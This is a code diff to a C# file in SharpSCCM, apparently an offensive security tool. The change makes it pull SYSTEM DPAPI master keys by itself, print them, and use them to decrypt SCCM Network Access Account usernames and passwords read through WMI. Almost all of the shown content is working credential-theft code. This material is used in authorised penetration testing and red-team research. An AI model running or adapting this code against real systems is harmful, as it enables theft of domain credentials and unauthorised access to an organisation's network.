@@ -2,6 +2,9 @@
 // https://github.com/GhostPack/SharpDPAPI
 
 using System;
+using System.Text;
+using System.Collections.Generic;
+using System.Linq;
 using System.Management;
 
 namespace SharpSCCM
@@ -20,7 +23,7 @@ namespace SharpSCCM
             }
         }
 
-        public static void LocalNetworkAccessAccountsWmi(string masterkey)
+        public static void LocalNetworkAccessAccountsWmi()
         {
             if (Helpers.IsHighIntegrity())
             {
@@ -37,18 +40,40 @@ namespace SharpSCCM
                         byte[] protectedUsernameBytes = Helpers.StringToByteArray(protectedUsername);
                         int length = (protectedUsernameBytes.Length + 16 - 1) / 16 * 16;
                         Array.Resize(ref protectedUsernameBytes, length);
+
+
+                        Dictionary<string, string> mappings = Dpapi.TriageSystemMasterKeys();
+
+                        Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
+                        foreach (KeyValuePair<string, string> kvp in mappings)
+                        {
+                            Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
+                        }
+                        Console.WriteLine();
+
                         try
                         {
-
-                            Dpapi.Execute(protectedUsername, masterkey);
-                            Dpapi.Execute(protectedPassword, masterkey);
-
+                            Dpapi.Execute(protectedUsername, mappings);
+                            Dpapi.Execute(protectedPassword, mappings);
                         }
                         catch (Exception e)
                         {
                             Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                             Console.WriteLine(e.ToString());
                         }
+
+                        //try
+                        //{
+
+                        //    Dpapi.Execute(protectedUsername, masterkey);
+                        //    Dpapi.Execute(protectedPassword, masterkey);
+
+                        //}
+                        //catch (Exception e)
+                        //{
+                        //    Console.WriteLine("[!] Data was not decrypted. An error occurred.");
+                        //    Console.WriteLine(e.ToString());
+                        //}
                     }
                 }
                 else
